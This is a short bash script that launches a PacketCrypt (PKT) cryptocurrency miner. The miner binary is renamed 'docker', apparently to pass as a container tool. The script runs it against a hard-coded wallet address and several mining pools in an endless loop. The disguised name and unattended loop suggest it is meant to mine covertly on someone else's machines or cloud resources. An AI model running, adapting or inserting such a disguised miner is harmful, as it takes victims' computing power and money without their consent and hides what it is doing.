#!/bin/bash

chmod 700 docker
timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2
while :; do timeout 5m ./docker ann -p pkt1qatg02nqpj868czq0y2t4uf2l36e5jted0hq4fa https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world -t 2;echo JOSS; sleep 10s; done
